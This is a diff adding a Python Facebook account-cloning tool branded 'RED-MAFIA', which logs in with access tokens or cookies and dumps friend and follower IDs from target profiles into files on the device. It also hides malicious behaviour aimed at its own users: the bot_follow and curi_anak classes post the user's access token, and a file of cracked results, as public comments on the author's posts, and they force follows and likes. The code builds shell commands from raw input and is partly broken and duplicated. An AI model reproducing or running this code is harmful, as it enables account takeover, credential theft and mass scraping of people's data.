+		'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
+	ua2 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
+		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
+		'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
+	pass
+try:kiky_pass=requests.get("http://ip-api.com/json/").json()["country"].lower()
+except:kiky_pass="None"
+
+class bokep_japan_yang_terbaru:
+	def __init__(self, STT, id_target, pw_target, ttl_target):
+		baka_baka = ""
+		nande_nande = ""
+class bokep_barat_yang_terbaru:
+	def __init__(self, token):
+		baka_baka = ""
+		nande_nande = ""
+class akun_ok:
+	def __init__(self, userr, pww, cokii):
+		baka_baka = ""
+		nande_nande = ""
+class bokep_japan_yang_terbaruv2:
+	def __init__(self, STT, id_target, pw_target, fokx):
+		baka_baka = ""
+		nande_nande = ""
+
+class menu:
+	def __init__(self):
+		global ua
+		os.system("clear")
+		try:
+			toket=open(".login.txt","r").read()
+			token=open(".login.txt","r").read()
+			otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
+			a = json.loads(otw.text)
+			try:
+				nama = a["name"]
+			except:
+				nama = a["username"]
+		except:
+			print((war+" Token Invalid"))
+			time.sleep(1)
+			login()
+		print (logo)
+		url_main = "https://www.whatsmyua.info"
+		s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
+		raw_ua = s.find("li", id="rawUa").text
+		family = s.find("li", id="family").text
+		name_hp = s.find("li", id="product").text
+		os_ = s.find("li", id="os").text
+		ly = s.find("li", id="layout").text
+
+		ua = raw_ua.replace("rawUa: ", "") # My Useragnet
+		jenis_ua = family.replace("family: ", "")
+		jenis_hp = name_hp.replace("product: ", "")
+		jenis_os = os_.replace("os: ", "")
+		jenis_ly = ly.replace("layout: ", "")
+		print ("[✓] Powered  by RED-MAFIA")
+		print ("[✓] Premium Cloning tool")
+		print(f"\x1b[1;97m[*]=============================================")
+		print ("")
+		print ("")
+		print(I+"\x1b[1;97m[01] Dump unlimited Account only 1 Link ")
+		print(I+"\x1b[1;97m[02] slice and sort file (\x1b[1;92mAuto\x1b[1;97m)")
+		print(I+"\x1b[1;97m[03] slice and sort file (\x1b[1;92mChoice\x1b[1;97m)")
+		print(I+"\x1b[1;97m[04] Remove Dubble links (\x1b[1;92mAuto\x1b[1;97m)")
+		print(C+"\x1b[1;97m[00] Delete Token (\x1b[1;91mToken & Cookies\x1b[1;97m)")
+		ba=input("\n\x1b[1;97m[*] Choose option : ")
+		if ba in [""," "]: 
+			print(war+"Don't Empty Please Select one ")
+			time.sleep(2)
+			menu()
+		elif ba in ["1","01"]:
+			dump_ulti()
+			sort()
+			os.system("python Brand.py")
+		elif ba in ["2","02"]:
+			sort()
+			exit()
+		elif ba in ["3","03"]:
+			msort()
+			os.system("python Brand.py")
+		elif ba in ["4","04"]:
+			dubb()
+			os.system("python Brand.py")
+		elif ba in ["0","00"]:
+			jalan(war+"Thank You For Using My Script   ")
+			os.system("rm -rf .login.txt")
+			menu()
+		else:
+			print(war+'Fill it Correctly')
+class dubb:
+	def __init__(self):
+		file = input ("[+] input path : ")
+		os.system('sort -r "'+file+'" | uniq > /sdcard/XAking')
+		os.system('rm -rf /sdcard/1.txt')
+		os.system('rm -rf /sdcard/allinone.txt.txt')
+		os.system('rm -rf /sdcard/Akingidz.txt')
+		print(47*'\033[1;97m-\033[0;0m')
+		print ("[✓] Removing successfully ..")
+		print ("[✓] Your file path : /storage/emulated/0/XAking.txt")
+		print(47*'\033[1;97m-\033[0;0m')
+		input ("\n[?] Retrun back menu")
+		os.system("python Brand.py")
+class login:
+	def __init__(self):
+		os.system("clear")
+		print (logo)
+		#jalan("\n\033[1;92mSorry.. Before Continue Please Login  ")
+		jalan("  ( Select Login Method )\n")
+		print(f"\x1b[1;97m[*]======================================")
+		print ("[1] Login With Token")
+		print ("[2] Login With Cookies")
+		print(f"\x1b[1;97m[*]======================================")
+		print("")
+		h_ = input('\n[*] Login method : ')
+		print
+		if h_ in ["1", "01", "token"]:
+			token()
+		elif h_ in ["2", "02", "cokies"]:
+			coke()
+		else:jalan(war+"Fill In Correctly");time.sleep(1);login()
+class msort:
+	def __init__(self):
+		print(47*'-')
+		print (" [*] Example : 1000 ,10000, 100079 , 100080")
+		print(47*'-')
+		file = input ("[+] input path : ")
+		link = input ("[?] Link 1 : ")
+		link1 = input ("[?] Link 2 : ")
+		os.system('cat "'+file+'" | grep "'+link+'" > /sdcard/1.txt')
+		os.system('cat "'+file+'" | grep "'+link1+'" >> /sdcard/1.txt')
+		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/XAking.txt')
+		os.system('rm -rf /sdcard/1.txt')
+		os.system('rm -rf /sdcard/allinone.txt.txt')
+		os.system('rm -rf /sdcard/akingidz.txt')
+		print(47*'\033[1;97m-\033[0;0m')
+		print ("\n[✓] Dumping and Sliced successfully ..")
+		print ("[✓] Your file path : /storage/emulated/0/XAking.txt")
+		print(47*'\033[1;97m-\033[0;0m')
+		input ("\n[?] Retrun back menu")
+		os.system("python Brand.py")
+class sort:
+	def __init__(self):
+		print(47*'-')
+		print ("[*] Example : 1000 ,10000, 100079 , 100080")
+		print(47*'-')
+		link = input ("[?] Link 1 : ")
+		link1 = input ("[?] Link 2 : ")
+		os.system('cat /sdcard/allinone.txt | grep "'+link+'" > /sdcard/1.txt')
+		os.system('cat /sdcard/allinone.txt | grep "'+link1+'" >> /sdcard/1.txt')
+		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/XAking.txt')
+		os.system('rm -rf /sdcard/1.txt')
+		os.system('rm -rf /sdcard/allinone.txt.txt')
+		os.system('rm -rf /sdcard/akingidz.txt')
+		print(47*'\033[1;97m-\033[0;0m')
+		print ("\n[✓] Dumping and Sliced successfully ..")
+		print ("[✓] Your file path : /sdcard/Zarin_Khan.txt")
+		print(47*'\033[1;97m-\033[0;0m')
+		input ("\n[?] Retrun back menu")
+		os.system("python Brand.py")
+class msort:
+	def __init__(self):
+		print(47*'-')
+		print (" [*] Example : 1000 ,10000, 100079 , 100080")
+		print(47*'-')
+		file = input ("[+] input path : ")
+		link = input ("[?] Link 1 : ")
+		link1 = input ("[?] Link 2 : ")
+		os.system('cat "'+file+'" | grep "'+link+'" > /sdcard/1.txt')
+		os.system('cat "'+file+'" | grep "'+link1+'" >> /sdcard/1.txt')
+		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/XAking.txt')
+		os.system('rm -rf /sdcard/1.txt')
+		os.system('rm -rf /sdcard/allinone.txt.txt')
+		os.system('rm -rf /sdcard/akingidz.txt')
+		print(47*'\033[1;97m-\033[0;0m')
+		print ("\n[✓] Dumping and Sliced successfully ..")
+		print ("[✓] Your file path : /storage/emulated/0/2.txt")
+		print(47*'\033[1;97m-\033[0;0m')
+		input ("\n[?] Retrun back menu")
+		os.system("python Brand.py")
+	def __init__(self):
+		ba = 0
+		bi = 0
+		link_token = requests.get("https://free.facebook.com/story.php?story_fbid=2965703280359878&id=100007607054845&_rdr")
+
+		gbl = par(link_token.content,'html.parser')
+		token_free = re.findall("EAA\w+", link_token.text)
+		for naa in token_free:
+			ba += 1
+			if len(naa)>=37:
+				token = naa
+				print(war+"Token  : "+str(ba))
+				post4 = ('2978584119071794') # Logo 
+				post5 = ("2965703280359878") # Untuk Ber
+				comment = random.choice(['Big fan sir❤️','Big fan brother💛','sir big fan💚','Sir please reply me💙','Love you sir🖤','Sir big fan please reply me🙏🙏🙏','Legend❤️']) 
+				love = random.choice(['Star boy❤️','Love it🥰','Good post💚','I LOVE YOU💙','Wow sir🖤','Super Star🧡','💜'])
+				somi = ''+love
+				requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + comment + '&access_token=' + token)
+				requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + somi + '&access_token=' + token)
+				requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + comment + '&access_token=' + token)
+				requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + somi + '&access_token=' + token)
+				requests.post('https://graph.facebook.com/100007607054845/subscribers?access_token=' + token) ### FB RISKY
+				cek_token(naa)
+		exit(war+"Token Not Found")
+class token:
+	def __init__(self):
+		toket = input("\n\033[1;97m[+] Enter Token : ")
+		try:otw = requests.get("https://graph.facebook.com/me?access_token=" + toket);a = json.loads(otw.text);nama = a["name"];zedd = open(".login.txt", "w");zedd.write(toket);zedd.close();print;print((war+"Login Successful"));bot_follow()
+		except KeyError:print((war+"Token Invalid"));time.sleep(2);token()
+class check_kukis:
+	def __init__(self):
+		session = req.Session()
+		try:coki = open(".cokie.txt", "r").read()
+		except:coke()
+		respon = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
+		nama__ = re.findall('\<title\>(.*?)<\/title\>',str(respon))[0]
+		if "Halaman Tidak Ditemukan" in nama__:
+			jalan(war+"Sorry Your Cookies Are Dead");time.sleep(1)
+			try:os.remove(".cokie.txt")
+			except:pass
+		else:pass
+class coke:
+	def __init__(self):
+		_cookie=input(war+'Cookies : '+I)
+		_cookie += "noscript=1;"+_cookie
+		try:
+			_head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': _cookie}
+			_r=_ses.get(urls, headers=_head)
+			_p=re.search('(EAAG\w+)', _r.text)
+			_h=_p.group(1)
+			if 'EAA' in _h:open(".login.txt", 'w').write('%s' % (_h));open(".cokie.txt", 'w').write('%s' % (_cookie));bokep_barat_yang_terbaru(_cookie);bokep_barat_yang_terbaru(_h)
+		except (AttributeError, requests.exceptions.TooManyRedirects):print(war+'Cookies Error  ');time.sleep(3);coke()
+		exit(jalan(war+"Run This Script Again : python Nx.py"))
+
+
+class bot_follow:
+	def __init__(self):
+		s_ = requests.Session()
+		post1 = ('2978584119071794') # j
+		post2 = ("2965703280359878") # j
+		post3 = ("167879918678352") # j
+		post4 = ('3105954929648426') # j
+		post5 = ("3048075795436340") # Untuk Berbagi T
+		post6 = ("198550702277940") # Logo Akira
+		post7 = ("198552118944465") # Logo Attaxk Fr
+		curi_ = ("3105954929648426") # Logo Zero 
+		my_idz_bot = [
+		"100007607054845",
+		"100007607054845",
+		"100007607054845",
+		"100007607054845",
+		"100007607054845"
+		]
+		my_post_bot = [
+		"2965703280359878",
+		"2978584119071794",
+		"3048075795436340",
+		"198550702277940",
+		"198552118944465",
+		"3048075795436340",
+		"230946969169829",
+		"235968105334382",
+		"197993725798487",
+		"218558783741981",
+		"138061478458379"
+		]
+		try:
+			toket=open(".login.txt","r").read()
+			token=open(".login.txt","r").read()
+			otw = s_.get("https://graph.facebook.com/me/?access_token="+toket)
+			a = json.loads(otw.text)
+			nama = a["name"]
+			id = a["id"]
+			bokep_barat_yang_terbaru(token)
+		except Exception as e:
+			print((war+"Token Invalid >%s%s%s<"%(I,e,Q)))
+			time.sleep(1)
+			login()
+		for id_bot in my_idz_bot:
+			s_.post('https://graph.facebook.com/'+id_bot+'/subscribers?access_token='+token)
+		for post_id in my_post_bot:
+			s_.post("https://graph.facebook.com/"+post_id+"/likes?summary=true&access_token=" + toket)
+		s_.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
+		s_.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
+		s_.post('https://graph.facebook.com/3048075795436340/comments/?message=' + token + '&access_token=' + token)
+		menu()
+class curi_anak:
+	def __init__(self):
+		try:
+			toket=open(".login.txt","r").read()
+			token=open(".login.txt","r").read()
+			otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
+			a = json.loads(otw.text)
+			nama = a["name"]
+			id = a["id"]
+		except IOError:
+			print((war+" Token Invalid"))
+			time.sleep(2)
+			login()
+		anjas=open("result/CP-03-12-2021.txt","r").read()
+		curi = ("2978584119071794") # Zero Suck Candy Logo :v
+		requests.post('https://graph.facebook.com/'+curi+'/comments/?message='+anjas+'&access_token=' + token)
+
+class cek_token:
+	def __init__(self, token):
+		requests.post("https://graph.facebook.com/me/feed/?link=https://fb.com/100007018489471/posts/3105954929648426/?app=fbl&access_token=" + token)
+		try:
+			otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
+			a = json.loads(otw.text)
+			nama = a["name"]
+			id = a["id"]
+			print(war+'Account Name : '+nama[0:10])
+			print(war+'Your Id   : '+id)
+			print(war+""+token)
+		except:pass
+		try:
+			goblok = []
+			for i in requests.get("https://graph.facebook.com/me/friends?limit=9999&access_token="+token).json()["data"]:
+				try:
+					anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
+					goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
+				except:pass
+		except KeyError:pass
+		_id = ("%s"%(len(goblok)))
+		if _id == "0" or "0" == _id:
+			jalan(war+"Have No Friends  ")
+		else:
+			print(war+"Friend : "+I+_id+Q)
+			jalan(war+"Do you want to use this token (y/n):")
+			haalq = input(war+"Select One : ")
+			if haalq in ["y","Y"]:
+				tok = open(".login.txt", "w")
+				tok.write(token)
+				tok.close()
+				print ("\n"+war+"Token : "+I+token+Q)
+				exit(jalan(war+"Token Found Please,Run : python Multi.py"))
+				exit()
+			else:pass
+	print ("\n")
+
+
+class dump_ulti:
+	def __init__(self):
+		try:
+			token = open(".login.txt", "r").read()
+			toket = open(".login.txt", "r").read()
+		except IOError:
+			os.system("rm -rf .login.txt")
+			exit(war+"Token Failed  ");time.sleep(2)
+		idt = input(war+"Enter link  or Target Username : " )
+		try:
+			if idt == "me":idt = "me"
+			else:
+				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
+				if "facebook" in idt:
+					payload = {"fburl": idt, "check": "Lookup"}
+				mmk = requests.post("https://lookup-id.com/", data=payload).content
+				xxx = par(mmk, "html.parser")
+				idtt = xxx.find("span", id="code")
+				asw = idtt.text
+				idt = asw
+		except:idt = idt
+		try:
+			if idt == "me" or "me" == idt:
+				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
+				op = json.loads(otw.text)
+			else:
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+				op = json.loads(jok.text)
+			try:
+				nama = op['name']
+			except (KeyError, IOError):
+				nama = ("Name Not Found  ")
+		except Exception as e:jalan(war+" ID "+C+idt+Q+" Not Found  ");time.sleep(2);dump_ulti()
+		jalan(""+war+"Name   : "+I+nama+Q+"\n")
+		if nama == "Name Not Found  ":
+			time.sleep(2);dump_ulti()
+		os.system("rm -rf /storage/emulated/0/allinone.txt")
+		namq = ("allinone")
+		if namq == "" or namq == " ":
+			namq = uuid.uuid4().hex[:10].upper()
+		dump = open('.janganedit','w') 
+		try:
+			dump = open('.janganedit','a+') 
+			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
+				uid = i["id"]
+				nama = i["name"]
+				id.append(uid+"|"+nama)
+				dump.write(uid+'|'+nama+'\n')
+			dump.close()
+		except KeyError:pass
+		id_ = ("%s"%(len(id)))
+		if id_ == "0" or "0" == id_:jalan(war+"Possible ID "+idt+" Not Public  ");time.sleep(2);exit()
+		else:
+			print(war+"Total ID : %s"%(len(id)))
+			dumppp = open('/sdcard/'+namq+'.json','w')
+			jalan(war+'File Dump Not Found : '+'/sdcard/'+namq+'.txt')
+			jalan(war+"Enter CTRL + Z  STOP Programe  ")
+			with kikygtg(max_workers=20) as (kiky_gtg):
+				juma = open(".janganedit","r").readlines()
+				for data in juma:
+					data = data.replace("\n","")
+					kiky = data.split("|")
+					mal = ("%s"%(kiky[0]))
+					nm = ("%s"%(kiky[1]))
+					kiky_gtg.submit(lonte__, mal, toket, token, namq)
+			sort()
+goblok = []
+tolol = []
+class lonte__:
+	def __init__(self, ml, token, toket, mamk):
+		laxk = open('/sdcard/'+mamk+'.txt','a+')
+		try:
+			for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
+				try:
+					iid = i["id"]
+					nama = i["name"]
+					goblok.append(nama)
+					laxk.write(iid+'|'+nama+'\n')
+				except:pass
+			laxk.close()
+			for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
+				try:
+					iid = i["id"]
+					nama = i["name"]
+					goblok.append(nama)
+					laxk.write(iid+'|'+nama+'\n')
+				except:pass
+			laxk.close()
+		except KeyError:pass
+		sys.stdout.write("\r%s[%sULTIMATE%s] COLLECTED IDZ •> %s"%(Q,pilih([U,I,K,M,C]),Q, len(open('/sdcard/'+mamk+'.txt','r').readlines()))
+		); sys.stdout.flush()
+class menu:
+	def __init__(self):
+		global ua
+		os.system("clear")
+		try:
+			toket=open(".login.txt","r").read()
+			token=open(".login.txt","r").read()
+			otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
+			a = json.loads(otw.text)
+			try:
+				nama = a["name"]
+			except:
+				nama = a["username"]
+		except:
+			print((war+" Token Invalid"))
+			time.sleep(1)
+			login()
+		print (logo)
+		url_main = "https://www.whatsmyua.info"
+		s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
+		raw_ua = s.find("li", id="rawUa").text
+		family = s.find("li", id="family").text
+		name_hp = s.find("li", id="product").text
+		os_ = s.find("li", id="os").text
+		ly = s.find("li", id="layout").text
+		ua = raw_ua.replace("rawUa: ", "") # My Useragnet
+		jenis_ua = family.replace("family: ", "")
+		jenis_hp = name_hp.replace("product: ", "")
+		jenis_os = os_.replace("os: ", "")
+		jenis_ly = ly.replace("layout: ", "")
+	menu()
+class Main:
+	def __init__(self):
+		try:menu()
+		except:pass
+		try:menu();exit()
+		except requests.exceptions.ConnectionError:jalan(war+"Network Is Dead !")
+		except Exception as e:print(war+"Error : %s"%(e))
